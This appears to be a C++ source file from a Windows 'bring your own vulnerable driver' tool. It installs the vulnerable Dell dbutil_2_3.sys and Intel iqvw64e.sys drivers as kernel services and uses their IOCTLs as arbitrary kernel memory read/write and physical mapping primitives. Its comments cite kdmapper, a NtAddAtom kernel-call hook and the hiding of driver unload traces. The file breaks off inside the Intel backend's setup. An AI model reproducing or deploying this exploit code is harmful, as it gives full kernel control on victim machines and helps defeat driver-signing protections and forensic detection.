#include "hinv_byovd.hpp"
#include "hinv_kmem.hpp"
#include "hinv_maintenance.hpp"
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <array>
#include <vector>

#include <bcrypt.h>

#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#endif

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib") // CMake links advapi32 for other toolchains
#endif

namespace hinv {
namespace byovd {

// ============================================================================
// Driver service helpers
// ============================================================================

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

class ScopedFileHandle {
public:
    ScopedFileHandle() = default;
    ~ScopedFileHandle() { reset(); }

    ScopedFileHandle(const ScopedFileHandle&) = delete;
    ScopedFileHandle& operator=(const ScopedFileHandle&) = delete;

    HANDLE get() const { return handle_; }

    void reset(HANDLE handle = INVALID_HANDLE_VALUE) {
        if (handle_ != INVALID_HANDLE_VALUE) CloseHandle(handle_);
        handle_ = handle;
    }

private:
    HANDLE handle_ = INVALID_HANDLE_VALUE;
};

static bool CanonicalizePath(const std::wstring& path, std::wstring& canonicalPath) {
    canonicalPath.clear();
    if (path.empty() || path.find(L'\0') != std::wstring::npos) return false;

    DWORD required = GetFullPathNameW(path.c_str(), 0, nullptr, nullptr);
    if (required == 0 || required > 32768) return false;

    std::vector<wchar_t> buffer(required);
    DWORD length = GetFullPathNameW(path.c_str(), required, buffer.data(), nullptr);
    if (length == 0 || length >= required) return false;

    canonicalPath.assign(buffer.data(), length);
    std::replace(canonicalPath.begin(), canonicalPath.end(), L'/', L'\\');
    return !canonicalPath.empty();
}

static std::wstring StripPathNamespace(std::wstring path) {
    std::replace(path.begin(), path.end(), L'/', L'\\');
    const std::wstring lower = ToLower(path);
    if (lower.rfind(L"\\\\?\\unc\\", 0) == 0 ||
        lower.rfind(L"\\??\\unc\\", 0) == 0) {
        return L"\\\\" + path.substr(8);
    }
    if (lower.rfind(L"\\\\?\\", 0) == 0 ||
        lower.rfind(L"\\??\\", 0) == 0) {
        path.erase(0, 4);
    }
    return path;
}

static bool IsAbsolutePath(const std::wstring& path) {
    return (path.size() >= 3 && iswalpha(path[0]) && path[1] == L':' && path[2] == L'\\') ||
           (path.size() >= 3 && path[0] == L'\\' && path[1] == L'\\');
}

static std::wstring NormalizeCanonicalPath(std::wstring path) {
    path = StripPathNamespace(std::move(path));
    return IsAbsolutePath(path) ? ToLower(std::move(path)) : std::wstring{};
}

static std::wstring NormalizeServiceBinaryPath(std::wstring value) {
    while (!value.empty() && iswspace(value.front())) value.erase(value.begin());
    while (!value.empty() && iswspace(value.back())) value.pop_back();
    if (value.empty()) return {};

    if (value.front() == L'"') {
        const size_t closing = value.find(L'"', 1);
        if (closing == std::wstring::npos) return {};
        for (size_t i = closing + 1; i < value.size(); ++i)
            if (!iswspace(value[i])) return {}; // reject command-line arguments
        value = value.substr(1, closing - 1);
    } else {
        for (wchar_t c : value)
            if (iswspace(c)) return {}; // an unquoted path with arguments is ambiguous
    }

    value = StripPathNamespace(std::move(value));
    if (!IsAbsolutePath(value)) return {};

    std::wstring canonicalPath;
    if (!CanonicalizePath(value, canonicalPath)) return {};
    return NormalizeCanonicalPath(std::move(canonicalPath));
}

static bool OpenGuardedDriverFile(const std::wstring& driverPath,
                                  std::wstring& canonicalPath,
                                  ScopedFileHandle& guard) {
    if (!CanonicalizePath(driverPath, canonicalPath)) {
        std::wcerr << L"[hinv::byovd] Could not canonicalize BYOVD path\n";
        return false;
    }

    DWORD attrs = GetFileAttributesW(canonicalPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        const DWORD err = GetLastError();
        std::wcerr << L"[hinv::byovd] Could not inspect BYOVD path attributes: " << err << L"\n";
        return false;
    }
    if ((attrs & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_REPARSE_POINT)) != 0) {
        std::wcerr << L"[hinv::byovd] BYOVD path is not a regular non-reparse file\n";
        return false;
    }

    HANDLE handle = CreateFileW(canonicalPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT |
                                    FILE_FLAG_SEQUENTIAL_SCAN,
                                nullptr);
    if (handle == INVALID_HANDLE_VALUE) {
        const DWORD err = GetLastError();
        std::wcerr << L"[hinv::byovd] Could not open guarded BYOVD file: " << err << L"\n";
        return false;
    }
    guard.reset(handle);

    BY_HANDLE_FILE_INFORMATION info{};
    if (!GetFileInformationByHandle(guard.get(), &info)) {
        const DWORD err = GetLastError();
        std::wcerr << L"[hinv::byovd] Could not inspect guarded BYOVD handle: " << err << L"\n";
        guard.reset();
        return false;
    }
    if (GetFileType(guard.get()) != FILE_TYPE_DISK ||
        (info.dwFileAttributes & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_REPARSE_POINT)) != 0) {
        std::wcerr << L"[hinv::byovd] Guarded BYOVD handle is not a regular non-reparse file\n";
        guard.reset();
        return false;
    }

    // Use the identity of the opened file, not merely the spelling supplied
    // by the caller. The guard handle stays open through service creation and
    // driver start, preventing a rename/reparse replacement between hashing
    // and SCM loading.
    DWORD finalLength = GetFinalPathNameByHandleW(guard.get(), nullptr, 0,
                                                  FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
    if (finalLength == 0 || finalLength > 32768) {
        guard.reset();
        return false;
    }
    std::vector<wchar_t> finalBuffer(finalLength + 1, L'\0');
    const DWORD finalWritten = GetFinalPathNameByHandleW(
        guard.get(), finalBuffer.data(), static_cast<DWORD>(finalBuffer.size()),
        FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
    if (finalWritten == 0 || finalWritten >= finalBuffer.size() ||
        !CanonicalizePath(StripPathNamespace(
                              std::wstring(finalBuffer.data(), finalWritten)), canonicalPath)) {
        guard.reset();
        return false;
    }
    return true;
}

static bool SetPrivilege(HANDLE hToken, LPCWSTR privilegeName) {
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) return false;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) != TRUE)
        return false;
    // AdjustTokenPrivileges returns TRUE even when the privilege was not
    // assigned; ERROR_NOT_ALL_ASSIGNED means the token does not hold it.
    return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

static bool EnableRequiredPrivileges() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    bool ok = SetPrivilege(hToken, SE_LOAD_DRIVER_NAME) &&
              SetPrivilege(hToken, SE_DEBUG_NAME);
    CloseHandle(hToken);
    return ok;
}

bool InstallDriverService(const std::wstring& serviceName, const std::wstring& driverPath,
                          bool* outCreated) {
    if (outCreated) *outCreated = false;
    if (!EnableRequiredPrivileges()) {
        std::wcerr << L"[hinv::byovd] Missing required privileges (SeLoadDriverPrivilege/SeDebugPrivilege)\n";
        return false;
    }
    // LoadVulnerableDriver passes the one canonical path protected by its open
    // guard handle. Do not resolve or reopen it here.
    if (NormalizeCanonicalPath(driverPath).empty()) return false;

    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hScm) return false;

    std::wstring serviceBinPath = driverPath;
    if (std::any_of(serviceBinPath.begin(), serviceBinPath.end(),
                    [](wchar_t c) { return iswspace(c) != 0; }))
        serviceBinPath = L"\"" + serviceBinPath + L"\"";

    SC_HANDLE hSvc = CreateServiceW(
        hScm,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        serviceBinPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Never adopt or repoint a service that another process may own.
            // The Intel backend has an explicit, path-checked recovery path for
            // its own leftovers; all other existing services require manual
            // recovery instead of destructive takeover.
            std::wcerr << L"[hinv::byovd] Service already exists: " << serviceName << L"\n";
        } else {
            std::wcerr << L"[hinv::byovd] CreateServiceW failed: " << err << L"\n";
        }
        CloseServiceHandle(hScm);
        return false;
    }

    if (outCreated) *outCreated = true;
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return true;
}

static bool WaitForServiceState(SC_HANDLE hSvc, DWORD desiredState, DWORD timeoutMs) {
    const DWORD start = GetTickCount();
    for (;;) {
        SERVICE_STATUS_PROCESS status{};
        DWORD bytes = 0;
        if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                                  reinterpret_cast<LPBYTE>(&status), sizeof(status), &bytes))
            return false;
        if (status.dwCurrentState == desiredState) return true;
        if (status.dwCurrentState != SERVICE_START_PENDING &&
            status.dwCurrentState != SERVICE_STOP_PENDING)
            return false;
        if (GetTickCount() - start >= timeoutMs) return false;
        Sleep(50);
    }
}

bool StartDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    bool ok = false;
    if (hSvc) {
        DWORD err = 0;
        if (StartServiceW(hSvc, 0, nullptr) == TRUE) {
            ok = WaitForServiceState(hSvc, SERVICE_RUNNING, 10000);
        } else {
            err = GetLastError(); // capture immediately: stream I/O can clobber it
            ok = (err == ERROR_SERVICE_ALREADY_RUNNING) &&
                 WaitForServiceState(hSvc, SERVICE_RUNNING, 10000);
        }
        if (!ok) {
            // Surface the real failure: 1275 = driver blocked (Defender
            // vulnerable-driver list), 577 = signature/CI policy, etc.
            std::wcerr << L"[hinv::byovd] StartServiceW(" << serviceName
                       << L") failed: " << err << L"\n";
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool StopDriverService(const std::wstring& serviceName) {
    constexpr DWORD kStopTimeoutMs = 30000;
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    bool ok = false;
    if (hSvc) {
        SERVICE_STATUS status{};
        SERVICE_STATUS_PROCESS current{};
        DWORD bytes = 0;
        if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                                  reinterpret_cast<LPBYTE>(&current), sizeof(current), &bytes) &&
            current.dwCurrentState == SERVICE_STOPPED) {
            ok = true;
        } else if (current.dwCurrentState == SERVICE_STOP_PENDING) {
            ok = WaitForServiceState(hSvc, SERVICE_STOPPED, kStopTimeoutMs);
        } else if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == TRUE) {
            ok = WaitForServiceState(hSvc, SERVICE_STOPPED, kStopTimeoutMs);
        } else {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_NOT_ACTIVE) {
                ok = true;
            } else {
                std::wcerr << L"[hinv::byovd] ControlService(STOP, " << serviceName
                           << L") failed: " << err << L"\n";
            }
        }
        if (!ok) {
            // A kernel-driver stop can complete just after the polling window
            // expires. Re-read the terminal state before declaring teardown
            // unsafe and leaving a service behind.
            SERVICE_STATUS_PROCESS finalState{};
            DWORD finalBytes = 0;
            if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                                     reinterpret_cast<LPBYTE>(&finalState),
                                     sizeof(finalState), &finalBytes) &&
                finalState.dwCurrentState == SERVICE_STOPPED) {
                ok = true;
            }
        }
        if (!ok) std::wcerr << L"[hinv::byovd] Service did not reach STOPPED: " << serviceName << L"\n";
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool RemoveDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), DELETE);
    bool ok = false;
    if (hSvc) {
        ok = DeleteService(hSvc) == TRUE;
        if (!ok) {
            DWORD err = GetLastError();
            std::wcerr << L"[hinv::byovd] DeleteService(" << serviceName
                       << L") failed: " << err << L"\n";
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

static bool QueryCanonicalServiceBinaryPath(SC_HANDLE hSvc, std::wstring& canonicalPath,
                                            DWORD* serviceType = nullptr) {
    canonicalPath.clear();
    DWORD needed = 0;
    if (QueryServiceConfigW(hSvc, nullptr, 0, &needed) != FALSE ||
        GetLastError() != ERROR_INSUFFICIENT_BUFFER ||
        needed < sizeof(QUERY_SERVICE_CONFIGW) || needed > (1u << 20)) {
        return false;
    }

    std::vector<uint8_t> buffer(needed);
    auto* config = reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(buffer.data());
    if (!QueryServiceConfigW(hSvc, config, needed, &needed) || !config->lpBinaryPathName)
        return false;

    canonicalPath = NormalizeServiceBinaryPath(config->lpBinaryPathName);
    if (canonicalPath.empty()) return false;
    if (serviceType) *serviceType = config->dwServiceType;
    return true;
}

static bool RemoveDriverServiceIfPathMatches(const std::wstring& serviceName,
                                             const std::wstring& expectedCanonicalPath) {
    const std::wstring expected = NormalizeCanonicalPath(expectedCanonicalPath);
    if (expected.empty()) return false;

    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT | SC_MANAGER_LOCK);
    if (!hScm) return false;
    SC_LOCK databaseLock = LockServiceDatabase(hScm);
    if (!databaseLock) {
        CloseServiceHandle(hScm);
        return false;
    }

    bool removed = false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), DELETE | SERVICE_QUERY_CONFIG);
    if (!hSvc) {
        const DWORD err = GetLastError();
        removed = err == ERROR_SERVICE_DOES_NOT_EXIST || err == ERROR_SERVICE_MARKED_FOR_DELETE;
    } else {
        std::wstring registered;
        DWORD serviceType = 0;
        if (!QueryCanonicalServiceBinaryPath(hSvc, registered, &serviceType) ||
            serviceType != SERVICE_KERNEL_DRIVER || registered != expected) {
            std::wcerr << L"[hinv::byovd] Refusing to delete service with a different binary path: "
                       << serviceName << L"\n";
        } else if (DeleteService(hSvc) == TRUE) {
            removed = true;
        } else {
            const DWORD err = GetLastError();
            removed = err == ERROR_SERVICE_MARKED_FOR_DELETE;
            if (!removed) {
                std::wcerr << L"[hinv::byovd] DeleteService(" << serviceName
                           << L") failed: " << err << L"\n";
            }
        }
        CloseServiceHandle(hSvc);
    }

    UnlockServiceDatabase(databaseLock);
    CloseServiceHandle(hScm);
    return removed;
}

static bool WaitForServiceDeletion(const std::wstring& serviceName, DWORD timeoutMs) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hScm) return false;

    const DWORD start = GetTickCount();
    bool deleted = false;
    for (;;) {
        SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_QUERY_STATUS);
        if (hSvc) {
            CloseServiceHandle(hSvc);
        } else {
            const DWORD err = GetLastError();
            if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
                deleted = true;
                break;
            }
            if (err != ERROR_SERVICE_MARKED_FOR_DELETE) break;
        }

        if (GetTickCount() - start >= timeoutMs) break;
        Sleep(50);
    }

    CloseServiceHandle(hScm);
    return deleted;
}

static bool HashFileSha256(HANDLE hFile, std::array<uint8_t, 32>& digest) {
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER beginning{};
    if (!SetFilePointerEx(hFile, beginning, nullptr, FILE_BEGIN)) return false;

    BCRYPT_ALG_HANDLE algorithm = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    std::vector<UCHAR> object;
    bool ok = false;

    do {
        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&algorithm, BCRYPT_SHA256_ALGORITHM,
                                                         nullptr, 0))) break;

        DWORD objectLength = 0;
        DWORD resultLength = 0;
        if (!BCRYPT_SUCCESS(BCryptGetProperty(algorithm, BCRYPT_OBJECT_LENGTH,
                                               reinterpret_cast<PUCHAR>(&objectLength),
                                               sizeof(objectLength), &resultLength, 0))) break;
        if (objectLength == 0 || objectLength > 1u << 20) break;
        object.resize(objectLength);
        if (!BCRYPT_SUCCESS(BCryptCreateHash(algorithm, &hash, object.data(), objectLength,
                                             nullptr, 0, 0))) break;

        std::array<uint8_t, 64 * 1024> buffer{};
        for (;;) {
            DWORD bytesRead = 0;
            if (!ReadFile(hFile, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesRead, nullptr))
                break;
            if (bytesRead == 0) {
                ok = BCRYPT_SUCCESS(BCryptFinishHash(hash, digest.data(),
                                                      static_cast<ULONG>(digest.size()), 0));
                break;
            }
            if (!BCRYPT_SUCCESS(BCryptHashData(hash, buffer.data(), bytesRead, 0))) break;
        }
    } while (false);

    if (hash) BCryptDestroyHash(hash);
    if (algorithm) BCryptCloseAlgorithmProvider(algorithm, 0);
    return ok;
}

static std::wstring HexDigest(const std::array<uint8_t, 32>& digest) {
    static constexpr wchar_t hex[] = L"0123456789abcdef";
    std::wstring result;
    result.reserve(digest.size() * 2);
    for (uint8_t byte : digest) {
        result.push_back(hex[byte >> 4]);
        result.push_back(hex[byte & 0x0F]);
    }
    return result;
}

static bool VerifyDriverProfile(HANDLE hFile, const DriverProfile& profile) {
    if (profile.expectedSha256.size() != 64) {
        std::wcerr << L"[hinv::byovd] Selected BYOVD profile has no valid SHA-256 allowlist entry\n";
        return false;
    }

    std::array<uint8_t, 32> digest{};
    if (!HashFileSha256(hFile, digest)) {
        std::wcerr << L"[hinv::byovd] Could not hash BYOVD file\n";
        return false;
    }
    const std::wstring actual = HexDigest(digest);
    if (ToLower(actual) != ToLower(profile.expectedSha256)) {
        std::wcerr << L"[hinv::byovd] BYOVD SHA-256 does not match the selected profile\n";
        return false;
    }
    return true;
}

static bool ValidAddressRange(uint64_t address, size_t size) {
    if (!address || !size) return false;
    const uint64_t length = static_cast<uint64_t>(size);
    return length - 1 <= UINT64_MAX - address;
}

// ============================================================================
// Dell dbutil_2_3.sys backend - arbitrary kernel virtual read/write
// ============================================================================

// Wire format per the real driver (KDU Hamakaze/idrv/dell.cpp reference):
// the transfer size is DERIVED from InputBufferLength - 0x18; there is no
// explicit size field. Both read and write use one shared METHOD_BUFFERED
// buffer (in == out).
#pragma pack(push, 1)
struct DbUtilRwPacket {
    uint64_t unused;         // +0x00
    uint64_t virtualAddress; // +0x08
    uint64_t offset;         // +0x10
    uint8_t  data[1];        // +0x18
};
#pragma pack(pop)
static_assert(offsetof(DbUtilRwPacket, data) == 0x18, "dbutil packet layout drifted");

class DbUtilBackend : public IByovdBackend {
public:
    DriverProfile profile_;
    HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
    std::wstring  serviceName_;
    std::wstring  driverPath_;
    bool          ownsService_ = false; // only stop/remove what WE installed
    maintenance::DriverUnloadState unloadPrevention_{};
    bool          serviceStopConfirmed_ = false;
    bool          teardownBlocked_ = false;

    ~DbUtilBackend() override { Shutdown(); }

    bool Initialize(const std::wstring& driverPath) override {
        driverPath_ = driverPath;
        serviceName_ = L"hinv_byovd_dbutil";

        bool created = false;
        if (!InstallDriverService(serviceName_, driverPath_, &created)) {
            std::wcerr << L"[hinv::byovd] Failed to install dbutil service\n";
            return false;
        }
        ownsService_ = created;
        if (!StartDriverService(serviceName_)) {
            std::wcerr << L"[hinv::byovd] Failed to start dbutil service\n";
            return false;
        }

        hDevice_ = CreateFileW(
            profile_.devicePath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDevice_ == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[hinv::byovd] Failed to open dbutil device: " << GetLastError() << L"\n";
            return false;
        }

        // Confirm the vulnerable read primitive itself works before exposing
        // the backend, rather than treating an open device as capability proof.
        uint64_t ntosBase = 0;
        for (const auto& m : kmem::EnumKernelModules()) {
            if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
                ntosBase = m.base;
                break;
            }
        }
        uint16_t mz = 0;
        if (!ntosBase || !ReadKernelMemory(ntosBase, &mz, sizeof(mz)) || mz != IMAGE_DOS_SIGNATURE) {
            std::wcerr << L"[hinv::byovd] dbutil read primitive failed sanity check\n";
            Shutdown();
            return false;
        }

        std::cout << "[hinv::byovd] dbutil backend ready (kernel read verified)\n";
        return true;
    }

    bool Shutdown() override {
        kmem::Trace("byovd: shutdown begin");
        if (teardownBlocked_) return false;
        if (!kmem::KernelCallsUsable()) {
            std::wcerr << L"[hinv::byovd] Refusing teardown while the kernel-call hook state is uncertain\n";
            return false;
        }
        if (ownsService_ && hDevice_ == INVALID_HANDLE_VALUE &&
            !serviceStopConfirmed_ && !unloadPrevention_.armed) {
            std::wcerr << L"[hinv::byovd] Refusing teardown without a confirmed device/prevention state\n";
            return false;
        }
        if (hDevice_ != INVALID_HANDLE_VALUE) {
            if (ownsService_ && !unloadPrevention_.armed &&
                !maintenance::PrepareDriverUnload(this, hDevice_, &unloadPrevention_)) {
                std::wcerr << L"[hinv::byovd] Refusing teardown: unload-trace prevention was not confirmed\n";
                return false;
            }
            if (ownsService_ && !StopDriverService(serviceName_)) {
                kmem::Trace("byovd: service stop FAILED");
                if (unloadPrevention_.armed &&
                    !maintenance::RestoreDriverUnload(this, unloadPrevention_)) {
                    std::wcerr << L"[hinv::byovd] Could not restore driver name after failed stop\n";
                    teardownBlocked_ = true;
                }
                return false;
            }
            if (ownsService_) serviceStopConfirmed_ = true;
        if (!ownsService_ && unloadPrevention_.armed &&
                !maintenance::RestoreDriverUnload(this, unloadPrevention_)) {
                teardownBlocked_ = true;
                return false;
            }
            if (!CloseHandle(hDevice_)) return false;
            hDevice_ = INVALID_HANDLE_VALUE;
            kmem::Trace("byovd: device handle closed");
        }
        // Only tear down the service when THIS instance installed it — an abort
        // path must never stop another live instance's driver.
        if (ownsService_ && !serviceName_.empty()) {
            bool stopped = serviceStopConfirmed_ || StopDriverService(serviceName_);
            if (stopped) serviceStopConfirmed_ = true;
            kmem::Trace(stopped ? "byovd: service stopped" : "byovd: service stop FAILED");
            if (stopped) {
                bool removed = RemoveDriverService(serviceName_);
                kmem::Trace(removed ? "byovd: service removed" : "byovd: service removal FAILED");
                if (!removed)
                    std::wcerr << L"[hinv::byovd] Service remains registered: " << serviceName_ << L"\n";
                if (removed) {
                    serviceName_.clear();
                    ownsService_ = false;
                } else {
                    return false;
                }
            } else {
                std::wcerr << L"[hinv::byovd] Refusing to delete a service that may still be loaded: "
                           << serviceName_ << L"\n";
                return false;
            }
        }
        kmem::Trace("byovd: shutdown end");
        return true;
    }

    bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }

    bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) override {
        if (!IsReady() || !out || !ValidAddressRange(kernelVa, size)) return false;
        constexpr size_t CHUNK = 0x1000;
        auto* dst = static_cast<uint8_t*>(out);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            // Transfer size = InputBufferLength - 0x18 (driver derives it).
            std::vector<uint8_t> buf(0x18 + n, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
            req->virtualAddress = kernelVa + off;

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.readIoc, buf.data(), static_cast<DWORD>(buf.size()),
                                 buf.data(), static_cast<DWORD>(buf.size()), &bytes, nullptr))
                return false;
            std::memcpy(dst + off, req->data, n);
        }
        return true;
    }

    bool WriteKernelMemory(uint64_t kernelVa, const void* inBuf, size_t size) override {
        if (!IsReady() || !inBuf || !ValidAddressRange(kernelVa, size)) return false;
        constexpr size_t CHUNK = 0x1000;
        const auto* src = static_cast<const uint8_t*>(inBuf);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            std::vector<uint8_t> buf(0x18 + n, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
            req->virtualAddress = kernelVa + off;
            std::memcpy(req->data, src + off, n);

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.writeIoc, buf.data(), static_cast<DWORD>(buf.size()),
                                 nullptr, 0, &bytes, nullptr))
                return false;
        }
        return true;
    }
};

// ============================================================================
// Intel iqvw64e.sys backend - kernel<->user memory copy
//
// Ported from TheCruZ/kdmapper (https://github.com/TheCruZ/kdmapper):
//   - kdmapper/include/intel_driver.hpp : constexpr ULONG32 ioctl1 = 0x80862007
//   - kdmapper/intel_driver.cpp         : _COPY_MEMORY_BUFFER_INFO (case 0x33),
//                                         MemCopy/ReadMemory/WriteMemory,
//                                         GetPhysicalAddress (0x25), MapIoSpace
//                                         (0x19), UnmapIoSpace (0x1A),
//                                         device path \\.\Nal
// The full physical-memory stack is ported: WriteReadOnlyMemory uses
// VA->PA + MapIoSpace + copy + UnmapIoSpace — that is the backbone of the
// ntoskrnl!NtAddAtom hook used by kmem::CallKernelFunction.
// ============================================================================

// Single multifunctional IOCTL (kdmapper intel_driver.hpp: ioctl1).
constexpr DWORD IOCTL_IQVW64E_COPY_MEMORY = 0x80862007;

// kdmapper intel_driver.cpp: _COPY_MEMORY_BUFFER_INFO. All-uint64 layout, so
// natural alignment matches the reference struct exactly (sizeof == 40).
struct Iqvw64eCopyMemoryInfo {
    uint64_t case_number;  // 0x33 = CopyMemory
    uint64_t reserved;
    uint64_t source;
    uint64_t destination;
    uint64_t length;
};

// kdmapper intel_driver.cpp: additional cases of the same multifunctional
// IOCTL. Layouts mirror the reference structs exactly (trailing u32 pads the
// struct to 48 bytes).
struct Iqvw64eGetPhysInfo {      // case 0x25: VA -> PA translation
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_physical_address;
    uint64_t address_to_translate;
};

struct Iqvw64eMapIoSpaceInfo {   // case 0x19: map physical memory
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_value;
    uint64_t return_virtual_address;
    uint64_t physical_address_to_map;
    uint32_t size;
};

struct Iqvw64eUnmapIoSpaceInfo { // case 0x1A: unmap physical memory
    uint64_t case_number;
    uint64_t reserved1;
    uint64_t reserved2;
    uint64_t virt_address;
    uint64_t reserved3;
    uint32_t number_of_bytes;
};

// Wire layouts mirror kdmapper's reference structs (all-u64 leading fields,
// trailing u32 padded) — lock them against accidental edits.
static_assert(sizeof(Iqvw64eCopyMemoryInfo) == 40, "iqvw64e CopyMemory layout drifted");
static_assert(sizeof(Iqvw64eGetPhysInfo) == 32, "iqvw64e GetPhysAddress layout drifted");
static_assert(sizeof(Iqvw64eMapIoSpaceInfo) == 48, "iqvw64e MapIoSpace layout drifted");
static_assert(sizeof(Iqvw64eUnmapIoSpaceInfo) == 48, "iqvw64e UnmapIoSpace layout drifted");

class IntelBackend : public IByovdBackend {
public:
    enum class LeftoverRecovery {
        NotFound,
        Removed,
        Failed,
    };

    DriverProfile profile_;
    HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
    std::wstring  serviceName_;
    std::wstring  driverPath_;
    bool          ownsService_ = false; // only stop/remove what WE installed
    maintenance::DriverUnloadState unloadPrevention_{};
    bool          serviceStopConfirmed_ = false;
    bool          teardownBlocked_ = false;

    ~IntelBackend() override { Shutdown(); }

    bool Initialize(const std::wstring& driverPath) override {
        driverPath_ = driverPath;
        serviceName_ = L"hinv_byovd_intel";

        // Inspect our dedicated service even when \\.\Nal is absent: a stopped
        // service left by a crashed run otherwise blocks safe recreation.
        const LeftoverRecovery recovery = TryRemoveOwnLeftover();
        if (recovery == LeftoverRecovery::Failed) return false;
        if (recovery == LeftoverRecovery::Removed) {
            std::wcerr << L"[hinv::byovd] Removed leftover iqvw64e from a previous run\n";
        }

        // Any remaining Nal device is owned by another load and must not be
        // collided with, regardless of whether our service name was present.
        HANDLE existing = CreateFileW(profile_.devicePath.c_str(), GENERIC_READ | GENERIC_WRITE,
                                      0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (existing != INVALID_HANDLE_VALUE) {
            CloseHandle(existing);
            std::wcerr << L"[hinv::byovd] \\\\.\\Nal already exists; another iqvw64e is loaded, aborting\n";
            return false;
        }

        bool created = false;
        if (!InstallDriverService(serviceName_, driverPath_, &created)) {
            std::wcerr << L"[hinv::byovd] Failed to install iqvw64e service\n";
            return false;
        }
        ownsService_ = created;
        if (!StartDriverService(serviceName_)) {
            std::wcerr << L"[hinv::byovd] Failed to start iqvw64e service\n";
            return false;
        }

        // kdmapper intel_driver.cpp Load(): the device is always \\.\Nal.
        hDevice_ = CreateFileW(
            profile_.devicePath.c_str(), // \\.\Nal
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDevice_ == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[hinv::byovd] Failed to open iqvw64e device (\\\\.\\Nal): " << GetLastError() << L"\n";
            return false;
        }

        // Ping: mirror kdmapper's Load() sanity check — read the ntoskrnl DOS
        // header through the exploit to confirm the copy primitive works.
        uint64_t ntosBase = 0;
